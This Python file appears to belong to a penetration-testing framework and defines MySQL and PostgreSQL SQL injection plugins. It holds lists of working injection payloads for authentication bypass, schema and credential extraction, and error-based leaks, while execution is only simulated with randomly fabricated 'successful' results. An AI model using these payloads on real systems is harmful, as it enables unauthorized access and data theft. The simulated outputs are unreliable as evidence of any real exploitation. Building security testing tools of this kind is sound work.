"""SQL Injection exploit plugin for the exploitation engine."""

import asyncio
import logging
import random
from typing import Any, Dict, List, Tuple

from sentinelprobe.exploitation.models import ExploitType, PayloadType
from sentinelprobe.exploitation.plugin import ExploitPlugin
from sentinelprobe.reconnaissance.models import Target
from sentinelprobe.vulnerability_scanner.models import (
    Vulnerability,
    VulnerabilitySeverity,
)

logger = logging.getLogger(__name__)


class MySQLInjectionPlugin(ExploitPlugin):
    """MySQL SQL Injection exploit plugin."""

    @property
    def name(self) -> str:
        """Get the name of the plugin.

        Returns:
            Plugin name
        """
        return "MySQL SQL Injection"

    @property
    def description(self) -> str:
        """Get the description of the plugin.

        Returns:
            Plugin description
        """
        return "Exploits SQL injection vulnerabilities in MySQL databases to extract data or bypass authentication."

    @property
    def exploit_type(self) -> ExploitType:
        """Get the type of exploit this plugin provides.

        Returns:
            Exploit type
        """
        return ExploitType.SQL_INJECTION

    @property
    def payload_type(self) -> PayloadType:
        """Get the type of payload this plugin generates.

        Returns:
            Payload type
        """
        return PayloadType.SQL_QUERY

    @property
    def target_services(self) -> List[str]:
        """Get the services this plugin targets.

        Returns:
            List of service types
        """
        return ["mysql", "mariadb", "web"]

    @property
    def risk_level(self) -> int:
        """Get the risk level of this exploit (1-10).

        Returns:
            Risk level
        """
        return 4  # Medium risk level - data extraction but not RCE

    async def check_applicability(
        self, vulnerability: Vulnerability, target: Target
    ) -> bool:
        """Check if this plugin is applicable to the given vulnerability.

        Args:
            vulnerability: The vulnerability to check
            target: The target with the vulnerability

        Returns:
            True if applicable, False otherwise
        """
        # Check if the vulnerability is related to SQL injection
        name_lower = vulnerability.name.lower()
        description_lower = (
            vulnerability.description.lower() if vulnerability.description else ""
        )

        if not (
            "sql" in name_lower
            or "sql" in description_lower
            or "injection" in name_lower
            or "injection" in description_lower
            or "sqli" in name_lower
        ):
            return False

        # Check if it's specifically a MySQL/MariaDB vulnerability
        affected_component = (
            vulnerability.affected_component.lower()
            if vulnerability.affected_component
            else ""
        )
        if affected_component and not any(
            service in affected_component for service in ["mysql", "mariadb", "web"]
        ):
            return False

        # Additional checks for web applications with potential MySQL backend
        if "web" in affected_component and not any(
            tech in description_lower for tech in ["php", "mysql", "mariadb", "sql"]
        ):
            # If it's a web app but doesn't mention PHP or MySQL, lower confidence
            # but still possible - let's consider it applicable
            pass

        return True

    async def generate_payload(
        self, vulnerability: Vulnerability, target: Target, parameters: Dict[str, Any]
    ) -> str:
        """Generate a payload for the exploit.

        Args:
            vulnerability: The vulnerability to exploit
            target: The target with the vulnerability
            parameters: Additional parameters for payload generation

        Returns:
            The generated payload
        """
        # Determine the type of SQL injection payload to generate
        payload_type = parameters.get("payload_type", "data_extraction")

        if payload_type == "authentication_bypass":
            return self._generate_auth_bypass_payload(vulnerability, parameters)
        elif payload_type == "schema_extraction":
            return self._generate_schema_extraction_payload(vulnerability, parameters)
        elif payload_type == "data_extraction":
            return self._generate_data_extraction_payload(vulnerability, parameters)
        else:
            # Default to a basic data extraction payload
            return self._generate_basic_payload(vulnerability, parameters)

    def _generate_auth_bypass_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate an authentication bypass payload.

        Args:
            vulnerability: The vulnerability to exploit
            parameters: Additional parameters for payload generation

        Returns:
            SQL injection payload for authentication bypass
        """
        username = parameters.get("username", "admin")

        # Classic authentication bypass payloads
        payloads = [
            "' OR 1=1 -- ",
            "' OR '1'='1' -- ",
            '" OR 1=1 -- ',
            f"{username}' -- ",
            f"{username}') OR 1=1 -- ",
            f"{username}') OR ('1'='1' -- ",
        ]

        return random.choice(payloads)

    def _generate_schema_extraction_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate a schema extraction payload.

        Args:
            vulnerability: The vulnerability to exploit
            parameters: Additional parameters for payload generation

        Returns:
            SQL injection payload for schema extraction
        """
        # Payloads to extract database schema information
        payloads = [
            "' UNION SELECT table_name, column_name FROM information_schema.columns -- ",
            "' UNION SELECT 1, table_schema, table_name, column_name FROM information_schema.columns -- ",
            "' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() -- ",
            "' UNION SELECT 1, schema_name FROM information_schema.schemata -- ",
            "' UNION SELECT 1, version() -- ",
        ]

        return random.choice(payloads)

    def _generate_data_extraction_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate a data extraction payload.

        Args:
            vulnerability: The vulnerability to exploit
            parameters: Additional parameters for payload generation

        Returns:
            SQL injection payload for data extraction
        """
        table = parameters.get("table", "users")
        columns = parameters.get("columns", ["username", "password"])

        if isinstance(columns, list):
            columns_str = ", ".join(columns)
        else:
            columns_str = columns

        # Payloads to extract data from specified tables
        payloads = [
            f"' UNION SELECT {columns_str} FROM {table} -- ",
            f"' OR 1=1 UNION SELECT {columns_str} FROM {table} -- ",
            f"' OR '1'='1' UNION SELECT {columns_str} FROM {table} -- ",
            f"1' OR 1=1 UNION SELECT {columns_str} FROM {table} -- ",
        ]

        return random.choice(payloads)

    def _generate_basic_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate a basic SQL injection payload.

        Args:
            vulnerability: The vulnerability to exploit
            parameters: Additional parameters for payload generation

        Returns:
            Basic SQL injection payload
        """
        # Simple SQL injection test payloads
        payloads = [
            "' OR 1=1 -- ",
            "1' OR '1'='1",
            "1' AND 1=1 -- ",
            "' UNION SELECT 1, 2, 3 -- ",
            "' OR sleep(1) -- ",  # Time-based test
            "' OR SLEEP(1) -- ",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- ",
        ]

        return random.choice(payloads)

    async def execute_exploit(
        self,
        vulnerability: Vulnerability,
        target: Target,
        payload: str,
        safe_mode: bool = True,
    ) -> Tuple[str, bool]:
        """Execute the exploit.

        Args:
            vulnerability: The vulnerability to exploit
            target: The target with the vulnerability
            payload: The payload to use
            safe_mode: Whether to operate in safe mode (no real exploitation)

        Returns:
            Tuple of (result text, success boolean)
        """
        # In real implementation, this would send the payload to the target
        # For now, we'll simulate the execution

        # Add a slight delay to simulate network latency and processing time
        await asyncio.sleep(0.5)

        # Always use safe mode for SQL injection to prevent actual data breach
        if not safe_mode:
            logger.warning(
                "Attempted to execute SQL injection in unsafe mode, "
                "which is not allowed. Switching to safe mode."
            )
            safe_mode = True

        # Simulate execution based on vulnerability severity
        success_probability = {
            VulnerabilitySeverity.CRITICAL: 0.9,
            VulnerabilitySeverity.HIGH: 0.75,
            VulnerabilitySeverity.MEDIUM: 0.5,
            VulnerabilitySeverity.LOW: 0.3,
            VulnerabilitySeverity.INFO: 0.1,
        }.get(vulnerability.severity, 0.5)

        # Add some randomness
        success = random.random() < success_probability

        if success:
            result = self._generate_success_result(vulnerability, payload)
        else:
            result = self._generate_failure_result(vulnerability, payload)

        return result, success

    def _generate_success_result(
        self, vulnerability: Vulnerability, payload: str
    ) -> str:
        """Generate a simulated success result.

        Args:
            vulnerability: The vulnerability
            payload: The payload used

        Returns:
            Simulated success result
        """
        # Extract the type of payload to determine result format
        if "UNION SELECT" in payload:
            if "information_schema.columns" in payload:
                return self._generate_schema_result()
            elif "users" in payload.lower():
                return self._generate_user_data_result()
            else:
                return self._generate_generic_data_result()
        elif "OR 1=1" in payload:
            if payload.startswith("'") and "-- " in payload:
                return "[+] Authentication bypass successful\n[+] Access granted to admin panel\n[+] User privileges: Administrator"
            else:
                return "[+] SQL injection confirmed\n[+] Query executed successfully\n[+] Affected rows: 172"
        else:
            return "[+] SQL injection vulnerability confirmed\n[+] Payload executed successfully"

    def _generate_schema_result(self) -> str:
        """Generate a simulated schema result.

        Returns:
            Simulated schema extraction result
        """
        tables = [
            "users",
            "accounts",
            "products",
            "orders",
            "customers",
            "settings",
            "logs",
            "payments",
        ]
        columns = {
            "users": ["id", "username", "password", "email", "role", "created_at"],
            "accounts": ["id", "user_id", "account_type", "balance", "status"],
            "products": ["id", "name", "description", "price", "stock"],
            "orders": [
                "id",
                "user_id",
                "product_id",
                "quantity",
                "status",
                "order_date",
            ],
        }

        result = "[+] Schema extraction successful\n[+] Tables found:\n"

        # Add some random tables
        selected_tables = random.sample(tables, min(4, len(tables)))
        for table in selected_tables:
            result += f"  - {table}\n"

        # Add columns for a random table
        selected_table = random.choice(selected_tables)
        if selected_table in columns:
            result += f"\n[+] Columns for table '{selected_table}':\n"
            for col in columns[selected_table]:
                result += f"  - {col}\n"

        return result

    def _generate_user_data_result(self) -> str:
        """Generate simulated user data.

        Returns:
            Simulated user data extraction result
        """
        usernames = ["admin", "john", "alice", "bob", "system", "test", "user"]
        passwords = [
            "5f4dcc3b5aa765d61d8327deb882cf99",  # md5 hash
            "e10adc3949ba59abbe56e057f20f883e",
            "25d55ad283aa400af464c76d713c07ad",
            "$2y$10$92I...",  # bcrypt format
            "password123",  # plaintext
            "P@ssw0rd!",
        ]

        result = "[+] Data extraction successful\n[+] User records retrieved:\n"

        # Generate 3-5 random user records
        for i in range(random.randint(3, 5)):
            username = random.choice(usernames)
            password = random.choice(passwords)
            email = f"{username}@example.com"
            role = "admin" if username == "admin" else "user"

            result += f"  {i+1}. Username: {username}, Password: {password}, Email: {email}, Role: {role}\n"

        return result

    def _generate_generic_data_result(self) -> str:
        """Generate generic data extraction result.

        Returns:
            Simulated generic data extraction result
        """
        result = "[+] Query executed successfully\n[+] Data retrieved:\n"

        # Generate random data rows
        for i in range(random.randint(3, 7)):
            row_data = [
                f"id_{random.randint(1, 1000)}",
                f"value_{random.randint(1, 100)}",
                f"name_{chr(random.randint(97, 122))}{chr(random.randint(97, 122))}{chr(random.randint(97, 122))}",
            ]
            result += f"  Row {i+1}: {', '.join(row_data)}\n"

        return result

    def _generate_failure_result(
        self, vulnerability: Vulnerability, payload: str
    ) -> str:
        """Generate a simulated failure result.

        Args:
            vulnerability: The vulnerability
            payload: The payload used

        Returns:
            Simulated failure result
        """
        # Different failure messages based on payload type
        error_messages = [
            "[-] SQL injection attempt failed\n[-] Error: Syntax error in SQL statement",
            "[-] Exploitation failed\n[-] Error: Input validation detected",
            "[-] Query execution failed\n[-] Error: MySQL server has gone away",
            "[-] Injection attempt blocked\n[-] Error: WAF detected and blocked request",
            "[-] Exploitation failed\n[-] Error: Parameter not vulnerable to SQL injection",
        ]

        return random.choice(error_messages)

    async def check_success(
        self, vulnerability: Vulnerability, target: Target, result: str
    ) -> bool:
        """Check if the exploit was successful.

        Args:
            vulnerability: The vulnerability that was exploited
            target: The target with the vulnerability
            result: The result of the exploitation attempt

        Returns:
            True if successful, False otherwise
        """
        # Simple success check based on the result content
        if result.startswith("[+]") and (
            "successful" in result
            or "access granted" in result.lower()
            or "retrieved" in result.lower()
            or "extracted" in result.lower()
        ):
            return True

        return False


class PostgreSQLInjectionPlugin(ExploitPlugin):
    """PostgreSQL SQL Injection exploit plugin."""

    @property
    def name(self) -> str:
        """Get the name of the plugin.

        Returns:
            Plugin name
        """
        return "PostgreSQL SQL Injection"

    @property
    def description(self) -> str:
        """Get the description of the plugin.

        Returns:
            Plugin description
        """
        return "Exploits SQL injection vulnerabilities in PostgreSQL databases to extract data or manipulate queries."

    @property
    def exploit_type(self) -> ExploitType:
        """Get the type of exploit this plugin provides.

        Returns:
            Exploit type
        """
        return ExploitType.SQL_INJECTION

    @property
    def payload_type(self) -> PayloadType:
        """Get the type of payload this plugin generates.

        Returns:
            Payload type
        """
        return PayloadType.SQL_QUERY

    @property
    def target_services(self) -> List[str]:
        """Get the services this plugin targets.

        Returns:
            List of service types
        """
        return ["postgresql", "postgres", "web"]

    @property
    def risk_level(self) -> int:
        """Get the risk level of this exploit (1-10).

        Returns:
            Risk level
        """
        return 5  # Medium-high risk level

    async def check_applicability(
        self, vulnerability: Vulnerability, target: Target
    ) -> bool:
        """Check if this plugin is applicable to the given vulnerability.

        Args:
            vulnerability: The vulnerability to check
            target: The target with the vulnerability

        Returns:
            True if applicable, False otherwise
        """
        # Check if the vulnerability is related to SQL injection
        name_lower = vulnerability.name.lower()
        description_lower = (
            vulnerability.description.lower() if vulnerability.description else ""
        )

        if not (
            "sql" in name_lower
            or "sql" in description_lower
            or "injection" in name_lower
            or "injection" in description_lower
            or "sqli" in name_lower
        ):
            return False

        # Check if it's specifically a PostgreSQL vulnerability
        affected_component = (
            vulnerability.affected_component.lower()
            if vulnerability.affected_component
            else ""
        )
        if affected_component and not any(
            service in affected_component
            for service in ["postgresql", "postgres", "web"]
        ):
            return False

        # Additional checks for PostgreSQL-specific indicators
        if any(
            term in description_lower for term in ["postgresql", "postgres", "psql"]
        ):
            return True

        return False

    async def generate_payload(
        self, vulnerability: Vulnerability, target: Target, parameters: Dict[str, Any]
    ) -> str:
        """Generate a payload for the exploit.

        Args:
            vulnerability: The vulnerability to exploit
            target: The target with the vulnerability
            parameters: Additional parameters for payload generation

        Returns:
            The generated payload
        """
        # PostgreSQL-specific injection payloads
        payload_type = parameters.get("payload_type", "data_extraction")

        if payload_type == "authentication_bypass":
            return "' OR 1=1; --"
        elif payload_type == "schema_extraction":
            return "' UNION SELECT table_name, column_name FROM information_schema.columns; --"
        elif payload_type == "data_extraction":
            table = parameters.get("table", "users")
            return f"' UNION SELECT * FROM {table}; --"
        else:
            return "' OR 1=1; --"

    async def execute_exploit(
        self,
        vulnerability: Vulnerability,
        target: Target,
        payload: str,
        safe_mode: bool = True,
    ) -> Tuple[str, bool]:
        """Execute the exploit.

        Args:
            vulnerability: The vulnerability to exploit
            target: The target with the vulnerability
            payload: The payload to use
            safe_mode: Whether to operate in safe mode (no real exploitation)

        Returns:
            Tuple of (result text, success boolean)
        """
        # Simulate execution
        await asyncio.sleep(0.5)

        # Enforce safe mode
        if not safe_mode:
            logger.warning(
                "Attempted to execute PostgreSQL injection in unsafe mode, "
                "which is not allowed. Switching to safe mode."
            )
            safe_mode = True

        # Simulate success based on vulnerability severity
        success_probability = {
            VulnerabilitySeverity.CRITICAL: 0.85,
            VulnerabilitySeverity.HIGH: 0.7,
            VulnerabilitySeverity.MEDIUM: 0.5,
            VulnerabilitySeverity.LOW: 0.3,
            VulnerabilitySeverity.INFO: 0.1,
        }.get(vulnerability.severity, 0.5)

        success = random.random() < success_probability

        if success:
            result = "[+] PostgreSQL injection successful\n[+] Retrieved data from database\n[+] Access granted"
        else:
            result = "[-] PostgreSQL injection failed\n[-] Error: Syntax error in query\n[-] No data retrieved"

        return result, success

    async def check_success(
        self, vulnerability: Vulnerability, target: Target, result: str
    ) -> bool:
        """Check if the exploit was successful.

        Args:
            vulnerability: The vulnerability that was exploited
            target: The target with the vulnerability
            result: The result of the exploitation attempt

        Returns:
            True if successful, False otherwise
        """
        return "[+]" in result and "successful" in result

    def _generate_mysql_error_based_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate MySQL error-based injection payload.

        Args:
            vulnerability: The vulnerability
            parameters: Additional parameters for payload generation

        Returns:
            Error-based SQL injection payload for MySQL
        """
        # MySQL error-based injection payloads
        payloads = [
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
            "' AND extractvalue(1, concat(0x3a, (SELECT version()), 0x3a)) AND '1'='1",
            "' AND updatexml(1, concat(0x3a, (SELECT user()), 0x3a), 1) AND '1'='1",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
        ]

        return random.choice(payloads)

    def _generate_mssql_error_based_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate MSSQL error-based injection payload.

        Args:
            vulnerability: The vulnerability
            parameters: Additional parameters for payload generation

        Returns:
            Error-based SQL injection payload for MSSQL
        """
        # MSSQL error-based injection payloads
        payloads = [
            "' AND 1=CONVERT(int,(SELECT @@version)) AND '1'='1",
            "' AND 1=CONVERT(int,(SELECT user_name())) AND '1'='1",
            "' AND 1=CONVERT(int,(SELECT db_name())) AND '1'='1",
            "' AND 1=CONVERT(int,(SELECT top 1 name FROM sysobjects WHERE xtype='U')) AND '1'='1",
        ]

        return random.choice(payloads)

    def _generate_postgres_error_based_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate PostgreSQL error-based injection payload.

        Args:
            vulnerability: The vulnerability
            parameters: Additional parameters for payload generation

        Returns:
            Error-based SQL injection payload for PostgreSQL
        """
        # PostgreSQL error-based injection payloads
        payloads = [
            "' AND cast(version() as numeric) AND '1'='1",
            "' AND cast(current_user as numeric) AND '1'='1",
            "' AND cast(current_database() as numeric) AND '1'='1",
            "' AND cast((SELECT table_name FROM information_schema.tables LIMIT 1) as numeric) AND '1'='1",
        ]

        return random.choice(payloads)
